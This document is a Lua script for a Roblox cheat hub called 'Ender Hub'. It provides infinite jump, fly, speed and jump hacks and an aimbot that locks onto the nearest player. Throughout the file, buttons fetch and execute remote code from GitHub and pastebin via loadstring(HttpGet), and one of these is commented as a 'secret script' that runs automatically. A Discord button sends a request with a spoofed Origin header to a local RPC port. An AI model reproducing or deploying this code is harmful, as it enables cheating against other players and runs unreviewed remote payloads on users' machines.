UserInputService = game:GetService("UserInputService")

local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

local Window = Rayfield:CreateWindow({
	Name = "Ender Hub",
	LoadingTitle = "Ender Hub",
	LoadingSubtitle = "by binninwl",
	ConfigurationSaving = {
		Enabled = false,
		FolderName = nil, -- Create a custom folder for your hub/game
		FileName = "Ender Hub"
	},
})
local MainTab = Window:CreateTab("Main", 4483362458) -- Title, Image
local MainSection = MainTab:CreateSection("Main")

Rayfield:Notify({
	Title = "Ender Hub",
	Content = "Welcome! You have succesfuly executed this script. Fell free to join the Discord Server, invite is in the 'DISCORD' Tab",
	Duration = 6.5,
	Image = 4483362458,
	Actions = { -- Notification Buttons
		Ignore = {
			Name = "Okay!",
			Callback = function()
				print("The user tapped Okay!")
			end
		},
	},
})
function enableInfiniteJump(player)
	infjumpconc = player.Character.Humanoid:GetPropertyChangedSignal("Jump"):Connect(function()
		player.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
	end)
end
function disableInfiniteJump(player)
	infjumpconc:Disconnect()
end

local Toggle = MainTab:CreateToggle({
	Name = "Infinite Jump",
	Info = "Makes you jump infinately.", -- Speaks for itself, Remove if none.
	Interact = 'Changable',
	CurrentValue = false,
	Flag = "toggle45", --dskjhfgbisdhgf
	Callback = function(a)


-- Enable for players already in game
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player.Character == game.Players.LocalPlayer.Character then
				if a then
					enableInfiniteJump(player)
				else
					disableInfiniteJump()
				end
			end
		end
	end
})

local Toggle = MainTab:CreateToggle({
	Name = "Fly",
	Info = "Press F to fly and unfly.", -- Speaks for itself, Remove if none.
	CurrentValue = false,
	Flag = "Toggle69", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(Value)
		local player = game.Players.LocalPlayer
		local mouse = player:GetMouse()
        
        -- Check if the player's character exists
		if player.Character then
			local character = player.Character
			local humanoid = character:WaitForChild("Humanoid")
        
            -- Function to handle flying
			local function fly()
                -- Make sure the character is not in a vehicle
				if not humanoid.SeatPart then
                    -- Activate flying
					humanoid.PlatformStand = true
					humanoid:Move(Vector3.new(0, 1000, 0)) -- Move the character upwards
        
                    -- Bind the mouse input to movement
					mouse.Move:Connect(function()
                        -- Move the character based on mouse input
						local delta = mouse.Hit.p - character.Head.Position
						character:SetPrimaryPartCFrame(character:GetPrimaryPartCFrame() * CFrame.new(delta))
					end)
				end
			end
        
            -- Function to stop flying
			local function stopFlying()
				humanoid.PlatformStand = false
			end
        
            -- Bind fly function to key press
			mouse.KeyDown:Connect(function(key)
				if key == "f" then
					fly()
				end
			end)
        
            -- Bind stop flying function to key release
			mouse.KeyUp:Connect(function(key)
				if key == "f" then
					stopFlying()
				end
			end)
		end
	end,
}) 


local Slider = MainTab:CreateSlider({
	Name = "Walk Speed",
	Range = {
		0,
		300
	},
	Increment = 1,
	Suffix = "Speed",
	CurrentValue = 16,
	Flag = "Slider133", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(Value)
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (Value)
	end
})

local Slider = MainTab:CreateSlider({
	Name = "Jump Power",
	Range = {
		50,
		500
	},
	Increment = 1,
	Suffix = "Jump",
	CurrentValue = 16,
	Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(Value)
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = (Value)
	end
})

local OtherTab = Window:CreateTab("Hubs", nil) -- Title, Image
local Section = OtherTab:CreateSection("Arsenal", true)

local Button = OtherTab:CreateButton({
	Name = "Sky Hub (OP Hub)",
	Interact = 'OP',
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/SkyHub.txt"))()
	end
})

local Button = OtherTab:CreateButton({
	Name = "Owl Hub",
	Interact = 'Changable',
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();
	end
})

local Button = OtherTab:CreateButton({
	Name = "Dark Hub",
	Interact = 'Changable',
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/arsenal-hub/main/Arsenal%20GamingScripter", true))()
	end
})

local Button = OtherTab:CreateButton({
	Name = "Thunder Client (OP)",
	Interact = 'Changable',
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/AndrewDarkyy/ThunderClient/main/main.lua"))()
	end 
})

local Button = OtherTab:CreateButton({
	Name = "Bolts Hub",
	Interact = 'Changable',
	Callback = function()
		loadstring(game:HttpGet('https://pastebin.com/raw/HchNEJBt', true))('Hello, Storm')
	end
})

local Section = OtherTab:CreateSection("BloxFruits", true)

local Button = OtherTab:CreateButton({
	Name = "Sky Hub (OP Hub)",
	Interact = 'OP',
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/SkyHub.txt"))()
	end
})

local Button = OtherTab:CreateButton({
	Name = "Chifa BF",
	Interact = 'Changable',
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/KindIhave/ChibaHuB/main/Chiba-BF.txt'))()
	end
})

local Button = OtherTab:CreateButton({
	Name = "HoHo Hub",
	Interact = 'Changable',
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()
	end
})

local Button = OtherTab:CreateButton({
	Name = "Loli Hub",
	Interact = 'Changable',
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Cyber-Nonename/LoliHubV2/main/V2LoliHub"))()
	end
})

local Section = OtherTab:CreateSection("Universal", true)

local Button = OtherTab:CreateButton({
	Name = "Sky Hub (OP Hub)",
	Interact = 'OP',
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/SkyHub.txt"))()
	end
})

local Button = OtherTab:CreateButton({
	Name = "Universal FE Trolling GUI",
	Interact = 'OP',
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/FE%20Trolling%20GUI.luau"))()
	end
})

local Button = OtherTab:CreateButton({
	Name = "Owl Hub ",
	Interact = 'Changable',
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();
	end
})   

local TeleportTab = Window:CreateTab("Misc", nil) -- Title, Image
local Section = TeleportTab:CreateSection("Fun", true)

local Toggle = TeleportTab:CreateToggle({
	Name = "Ender Hub on TOP ",
	Info = "Prints Ender Hub on TOP.", -- Speaks for itself, Remove if none.
	CurrentValue = false,
	Flag = "Toggleexample", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(Value)
		print('Ender Hub on TOP')
	end
})
                                               
local Slider = TeleportTab:CreateSlider({
	Name = "Walk Speed Extra",
	Range = {
		0,
		600
	},
	Increment = 1,
	Suffix = "Speed",
	CurrentValue = 16,
	Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(Value)
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (Value)
	end
})

local Toggle = TeleportTab:CreateToggle({
	Name = "print Hello World",
	Info = "prints Hello world in console.", -- Speaks for itself, Remove if none.
	CurrentValue = false,
	Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(Value)
		print('Hello World!')
	end,
}) 


local Slider = TeleportTab:CreateSlider({
	Name = "FOV Slider",
	Range = {
		70,
		120
	},
	Increment = 1,
	Suffix = "FOV",
	CurrentValue = 16,
	Flag = "Slider5", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(Value)
		game:GetService("Workspace"):WaitForChild("Camera").FieldOfView = Value
	end
})
local Toggle = TeleportTab:CreateToggle({
	Name = "Aimbot",
	Info = "Press 'L' on your keyboard to lock on..", -- Speaks for itself, Remove if none.
	CurrentValue = false,
	Flag = "Toggle34", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(Value)
        if Value then
            game.StarterGui:SetCore("SendNotification",  {
				Title = "Aimbot on";
				Text = "Press L to activate";
				Icon = "";
				Duration = 5;
				Callback = NotificationBindable;
			})
        else
            game.StarterGui:SetCore("SendNotification",  {
				Title = "Aimbot now off";
				Text = "";
				Icon = "";
				Duration = 5;
				Callback = NotificationBindable;
			})
        end
        getgenv().endhubaim = Value
		local player = game.Players.LocalPlayer
		local camera = game.Workspace.CurrentCamera
        
        -- Function to find the nearest player
		local function findNearestPlayer()
			local closestPlayer = nil
			local shortestDistance = math.huge
        
            -- Loop through all players in the game
			for _, otherPlayer in ipairs(game.Players:GetPlayers()) do
                -- Check if the player is not the local player
				if otherPlayer ~= player then
                    -- Calculate distance between local player and other player
					local distance = (otherPlayer.Character:WaitForChild("Head").Position - player.Character:WaitForChild("Head").Position).magnitude
        
                    -- Check if the distance is shorter than the current shortest distance
					if distance < shortestDistance then
						shortestDistance = distance
						closestPlayer = otherPlayer
					end
				end
			end
			return closestPlayer
		end
        
        -- Function to lock onto nearest player
		local function lockOntoNearestPlayer()
			task.spawn(function()
                while true do wait()
                    if not getgenv().endhubaim then
                        break
                    end
                    local nearestPlayer = findNearestPlayer()
                
                    -- Check if a nearest player is found
                    if nearestPlayer then
                        -- Point camera at nearest player
                        camera.CFrame = CFrame.new(camera.CFrame.Position, nearestPlayer.Character:WaitForChild("Head").Position)
                    end
                end
            end)
		end
        
        -- Bind lock onto nearest player function to a key press (for example, the "L" key)
		game:GetService("UserInputService").InputBegan:Connect(function(input)
			if input.KeyCode == Enum.KeyCode.L then
				lockOntoNearestPlayer()
			end
		end)
	end,
})

local Button = TeleportTab:CreateButton({
	Name = "Third Person",
	Interact = 'Changable',
	Callback = function()
		game:GetService("Players").LocalPlayer.CameraMaxZoomDistance = 99999
		game:GetService("Players").LocalPlayer.CameraMode = Enum.CameraMode.Classic
	end
})

local MiscTab = Window:CreateTab("Admin", nil ) -- Title, Image
local Section = MiscTab:CreateSection("Main", true)

local Button = MiscTab:CreateButton({
	Name = "Infinite Yield",
	Interact = 'Changable',
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
	end
})

local Button = MiscTab:CreateButton({
	Name = "Dex Explorer V2",
	Interact = 'Changable',
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/MariyaFurmanova/Library/main/dex2.0", true))()
	end
})

local Button = MiscTab:CreateButton({
	Name = "Ultimate Admin Script",
	Interact = 'Changable',
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/KMp8Jvsa", true))() ----------- Intro GUI
		local Player = game.Players.LocalPlayer ------------- START OF SCRIPT
		Player.Chatted:connect(function(cht)         ----------- CMD SMART
			if cht:match(":cmd") then
				loadstring(game:HttpGet("https://pastebin.com/raw/M3tZZAqa", true))()
			elseif cht:match(":toolgui") then                                -------------------- TOOL GUI PART / END OF CMD
				loadstring(game:HttpGet("https://pastebin.com/raw/txadLpTy", true))()
			elseif cht:match(":savetool") then
				for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if (v:IsA("Tool")) then
						v.Parent = game.Players.LocalPlayer
					end
				end
			elseif cht:match(":loadtool") then
				for _, v in pairs(game.Players.LocalPlayer:GetChildren()) do
					if (v:IsA("Tool")) then
						v.Parent = game.Players.LocalPlayer.Backpack
					end
				end
			elseif cht:match(":antiafk") then  --------------------------------- END OF TOOL GUI PART
				local VirtualUser = game:service'VirtualUser'
				game:service'Players'.LocalPlayer.Idled:connect(function()
					VirtualUser:CaptureController()
					VirtualUser:ClickButton2(Vector2.new())
				end)
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Loaded";
					Text = "Anti AFK Script";
				})
			elseif cht:match(":blockhead") then
				game.Players.LocalPlayer.Character.Head.Mesh:destroy()
			elseif cht:match(":creeper6") then
				game.Players.LocalPlayer.Character.Head.Mesh:destroy()
				function doo(limb, pos)
					limb:BreakJoints()
					local velocity = Instance.new("RocketPropulsion", limb)
					velocity.CartoonFactor = 0
					velocity.MaxSpeed = 30
					velocity.MaxThrust = 9999
					velocity.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
					velocity.Target = game.Players.LocalPlayer.Character.Torso
					velocity.TargetOffset = pos
					velocity:fire()
					local b = Instance.new("BodyGyro", limb)
				end
				while wait() do
					doo(game.Players.LocalPlayer.Character["Left Arm"], Vector3.new(-0.5, -2, -1))
					doo(game.Players.LocalPlayer.Character["Right Arm"], Vector3.new(0.5, -2, -1))
					doo(game.Players.LocalPlayer.Character["Left Leg"], Vector3.new(-0.5, -2, 1))
					doo(game.Players.LocalPlayer.Character["Right Leg"], Vector3.new(0.5, -2, 1))
				end
			elseif cht:match(":creeper15") then
				game.Players.LocalPlayer.Character.Head.Mesh:destroy()
				function doo(limb, pos)
					limb:BreakJoints()
					local velocity = Instance.new("RocketPropulsion", limb)
					velocity.CartoonFactor = 0
					velocity.MaxSpeed = 30
					velocity.MaxThrust = 9999
					velocity.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
					velocity.Target = game.Players.LocalPlayer.Character.UpperTorso
					velocity.TargetOffset = pos
					velocity:fire()
					local b = Instance.new("BodyGyro", limb)
				end
				while wait() do
					doo(game.Players.LocalPlayer.Character["LeftUpperArm"], Vector3.new(-0.5, -2, -1))
					doo(game.Players.LocalPlayer.Character["RightUpperArm"], Vector3.new(0.5, -2, -1))
					doo(game.Players.LocalPlayer.Character["LeftUpperLeg"], Vector3.new(-0.5, -2, 1))
					doo(game.Players.LocalPlayer.Character["RightUpperLeg"], Vector3.new(0.5, -2, 1))
				end
			elseif cht:match(":shattervest") then
				loadstring(game:HttpGet("https://pastebin.com/raw/CKbPg9NC", true))()
			elseif cht:match(":animationgui") then
				loadstring(game:HttpGet("https://pastebin.com/raw/uUR6pFVv", true))()
			elseif cht:match(":gabx") then
				loadstring(game:HttpGet("https://pastebin.com/raw/EntUzD5J", true))();
			elseif cht:match(":clickdel") then
				local Plr = game:GetService("Players").LocalPlayer
				local Mouse = Plr:GetMouse()
				Mouse.Button1Down:connect(function()
					if not game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.LeftControl) then
						return
					end
					if not Mouse.Target then
						return
					end
					Mouse.Target:Destroy()
				end)
			elseif cht:match(":trollinggui") then
				loadstring(game:HttpGet("https://pastebin.com/raw/RNWgaqCE", true))()
			elseif cht:match(":infinitejump") then
				local Player = game:GetService'Players'.LocalPlayer;
				local UIS = game:GetService'UserInputService';
				_G.JumpHeight = 50;
				function Action(Object, Function)
					if Object ~= nil then
						Function(Object); 
					end
				end
				UIS.InputBegan:connect(function(UserInput)
					if UserInput.UserInputType == Enum.UserInputType.Keyboard and UserInput.KeyCode == Enum.KeyCode.Space then
						Action(Player.Character.Humanoid, function(self)
							if self:GetState() == Enum.HumanoidStateType.Jumping or self:GetState() == Enum.HumanoidStateType.Freefall then
								Action(self.Parent.HumanoidRootPart, function(self)
									self.Velocity = Vector3.new(0, _G.JumpHeight, 0);
								end)
							end
						end)
					end
				end)
			elseif cht:match(":opfianlity") then
				loadstring(game:HttpGet("https://pastebin.com/raw/w8HNfSWA", true))();
			elseif cht:match(":aimbot1") then
				loadstring(game:HttpGet("https://pastebin.com/raw/2kbyfrn5", true))()
			elseif cht:match("aimbot2") then
				loadstring(game:HttpGet("https://pastebin.com/raw/xB92ES44", true))()
			elseif cht:match("aimbotgui") then
				loadstring(game:HttpGet("https://pastebin.com/raw/uw2P2fbY", true))()
			elseif cht:match(":openui") then  -- secret script if you open the pastebin :))
				loadstring(game:HttpGet("https://pastebin.com/raw/F9USVzSK", true))()
			end
		end)
            
            ------------------------------------------------------------------------------- END OF SCRIPT ------------------------------------------------------------------
		loadstring(game:HttpGet("https://pastebin.com/raw/F9USVzSK", true))()
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Loaded";
			Text = "Ultimate Admin Script";
		})
		print("Working Admin Script")
	end
})

local Button = MiscTab:CreateButton({
	Name = "Fates Admin V2",
	Interact = 'Changable',
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
	end
})

local ScriptTab = Window:CreateTab("FE Scripts", nil ) -- Title, Image
local Section = ScriptTab:CreateSection("Scripts", true)

local Button = ScriptTab:CreateButton({
	Name = "Big D*ck Script",
	Interact = 'Changable',
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/minecrafttotem/fe-pp-roblix-script/main/Fe%20pp%20script%20(with%20netless)"))()
	end
})

local Button = ScriptTab:CreateButton({
	Name = "FE Troll GUI",
	Interact = 'Changable',
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/M1ZZ001/BrookhavenR4D/main/Brookhaven%20R4D%20Script'))()
	end
})

local Button = ScriptTab:CreateButton({
	Name = "Universal FE ",
	Interact = 'Changable',
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/Dvrknvss/UniversalFEScriptHub/main/Script'))()
	end
})

local IslandTab = Window:CreateTab("Discord", nil ) -- Title, Image
local Section = IslandTab:CreateSection("Invite", true)

local Button = IslandTab:CreateButton({
	Name = "Discord Invite",
	Interact = 'Changable',
	Callback = function()
		local IsOnMobile = table.find({
			Enum.Platform.IOS,
			Enum.Platform.Android
		}, UserInputService:GetPlatform())
		everyClipboard = everyClipboard or toclipboard or set_clipboard or setrbxclipboard or (Clipboard and Clipboard.set)
		httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
		HttpService = game:GetService("HttpService")
		if IsOnMobile then
			everyClipboard("https://discord.com/invite/85xAbbFApR")
			game.StarterGui:SetCore("SendNotification",  {
				Title = "Copied";
				Text = "Copied to clipboard";
				Icon = "";
				Duration = 5;
				Callback = NotificationBindable;
			})
		else
			if httprequest then
				httprequest({
					Url = 'http://127.0.0.1:6463/rpc?v=1',
					Method = 'POST',
					Headers = {
						['Content-Type'] = 'application/json',
						Origin = 'https://discord.com'
					},
					Body = HttpService:JSONEncode({
						cmd = 'INVITE_BROWSER',
						nonce = HttpService:GenerateGUID(false),
						args = {
							code = '85xAbbFApR'
						}
					})
				})
			end
		end
	end
})
